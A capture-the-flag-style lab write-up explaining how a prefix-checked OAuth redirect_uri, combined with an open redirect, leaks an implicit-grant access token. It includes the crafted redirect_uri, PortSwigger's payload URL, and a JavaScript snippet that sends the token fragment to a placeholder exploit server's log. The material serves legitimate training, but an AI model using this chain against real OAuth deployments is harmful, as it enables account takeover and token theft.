# Stealing OAuth access tokens via an open redirect

**Category:** OAuth authentication
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

Not every `redirect_uri` validation flaw is "accepts anything." Some providers do whitelist, but
whitelist the wrong thing — a string prefix instead of an exact URL — which looks safe until you
remember that `/../` is legal in a URL path and browsers happily resolve it client-side after the
server has already approved the string. This lab chains that specific gap with an unrelated feature
elsewhere in the client app to move an access token from the OAuth provider straight into an
attacker's hands.

## The Target

This flow uses the implicit grant (`response_type=token`), so the access token comes back embedded
in the URL fragment (`#access_token=...`) rather than as a server-exchanged code. The blog also has
an unrelated navigation feature on its post pages — a "Next post" link built as
`/post/next?path=/post?postId=N` — which we found accepted arbitrary absolute URLs in `path`, not
just other post paths on the same site. That's a textbook open redirect, sitting on a page with
nothing to do with authentication at all.

## The Investigation

We started by probing the OAuth provider's `redirect_uri` handling the same way we had for the
previous lab, expecting either strict validation or none. What we got was in between: appending
`/../something` onto the legitimate `redirect_uri` was accepted without error. That's a whitelist
implemented as a prefix check — "does the supplied value start with our registered callback?" — which
a `../` segment satisfies trivially while still letting the browser resolve the actual final
destination to something else entirely once the redirect fires.

That's a code-leak primitive on its own, but this lab's grant type is implicit, not code — the value
that matters is an access token living in a URL fragment, not a code in the query string. Fragments
have a hard rule browsers enforce: they're never sent to the server as part of an HTTP request, they
only exist client-side, and they *are* preserved across a `window.location` redirect from one page to
another, including cross-origin ones. So the traversal alone gets us to an arbitrary path on the
client's own origin — not off-site — while keeping the fragment intact. What we needed next was a way
to get from an on-site page carrying that fragment to our exploit server without losing it, and open
redirects preserve fragments across origins exactly the same way normal redirects do. The "Next
post" feature was that hop.

## The Exploit

The traversal target was the open redirect itself, addressed relative to the legitimate
`redirect_uri`:

```
redirect_uri=https://LAB/oauth-callback/../post/next?path=https://EXPLOIT/exploit
```

The OAuth provider accepts this because it starts with the whitelisted `/oauth-callback` prefix. The
browser then resolves `../` and lands on `/post/next?path=https://EXPLOIT/exploit` — still on the
blog's own origin — with `#access_token=TOKEN` riding along in the fragment. The open redirect
forwards the browser on to the exploit server, and the fragment survives that hop too.

Getting the token out required a two-phase page, since the first load of our exploit page has no
fragment yet — it's the thing that kicks off the OAuth redirect in the first place:

```html
<script>
if (!document.location.hash) {
    window.location = "AUTH_URL";
} else {
    window.location = "EXPLOIT_SERVER/log?" + document.location.hash.substr(1);
}
</script>
```

On first load (no hash), it sends the victim into the crafted authorization URL. Once the whole
redirect chain completes and the victim's browser lands back on this same page — now carrying the
token in the fragment — the second branch fires, appending the fragment onto a request to our own
`/log` endpoint as a plain query string, which puts it somewhere we can actually read it: the exploit
server's access log. Delivered to the admin, this needed no interaction — an active OAuth session
meant the whole chain auto-authorized. Pulling the token from the log and calling the OAuth
provider's `/me` endpoint with `Authorization: Bearer TOKEN` returned the admin's profile, including
the API key, which we submitted to solve the lab.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution finds the same two ingredients — `redirect_uri` traversal accepted by prefix
match, and the "Next post" open redirect — and chains them the same way, with a comparable payload:

```
https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
```

Same traversal, same target feature, same end goal of leaking the token to attacker-controlled
infrastructure and using it against `/me` for the admin's API key.

The delivery differs. PortSwigger's walkthrough is the longest solution in this series to write out
manually — eighteen steps — because a Collaborator-free, browser-driven proof of a fragment-preserving
redirect chain takes real care to verify one hop at a time in Burp. We collapsed that into a single
scripted flow: an `httpx` client posts the two-phase JavaScript payload to the exploit server,
triggers delivery, waits, then regexes `access_token=` straight out of the resulting access log —
the same verification, done by re-fetching the log instead of watching it update in a browser tab.

## What This Teaches Us

Two independently unremarkable decisions combined into a full account takeover here: a `redirect_uri`
check that only verifies a prefix, and a redirect feature that trusts an arbitrary absolute URL. On
their own, neither looks like an authentication bug — the OAuth provider isn't wrong to think
`/oauth-callback/../post/next` "starts with" a valid callback, and the blog isn't wrong to think a
"next post" link needs to redirect somewhere. It's the interaction that's dangerous, and that's the
general lesson for `redirect_uri` validation: prefix and substring checks are not equivalent to exact
match, and *any* open redirect anywhere on the client's origin becomes part of the OAuth threat model
the moment the provider accepts anything less strict than an exact URI comparison.
